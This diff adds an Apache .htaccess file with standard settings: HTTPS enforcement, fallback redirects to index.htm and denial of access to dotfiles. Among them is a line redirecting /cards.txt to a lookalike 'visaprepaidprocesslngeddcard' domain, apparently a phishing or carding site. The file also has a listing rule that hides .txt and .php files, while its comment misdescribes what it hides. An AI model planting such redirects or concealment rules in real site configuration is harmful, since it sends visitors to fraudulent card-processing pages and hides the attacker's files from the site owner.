@@ -1,0 +1,43 @@
+# Deny access to .htaccess
+<Files .htaccess>
+Order allow,deny
+Deny from all
+</Files>
+
+##Add SSL
+RewriteEngine On
+RewriteCond %{HTTPS} !=on
+RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301,NE]
+Header always set Content-Security-Policy "upgrade-insecure-requests;"
+
+##Redirect non-existing links to index.htm
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.htm [L]
+</IfModule>
+
+##Redirect non-existing pages to index.htm
+Options +SymLinksIfOwnerMatch 
+RewriteEngine On 
+RewriteCond %{REQUEST_FILENAME} !-f 
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.htm [L]
+
+##Redirect to an external site file
+Redirect /cards.txt https://visaprepaidprocesslngeddcard.webpg.top
+
+##Disallow a listing of directory files you can use
+Options -Indexes 
+
+# Hide files of type .png, .zip, .jpg, .gif and .doc from listing
+IndexIgnore *.txt *.htaccess *.php
+
+# Deny access to filenames starting with dot(.)
+<FilesMatch "^\.">
+Order allow,deny
+Deny from all
+</FilesMatch>
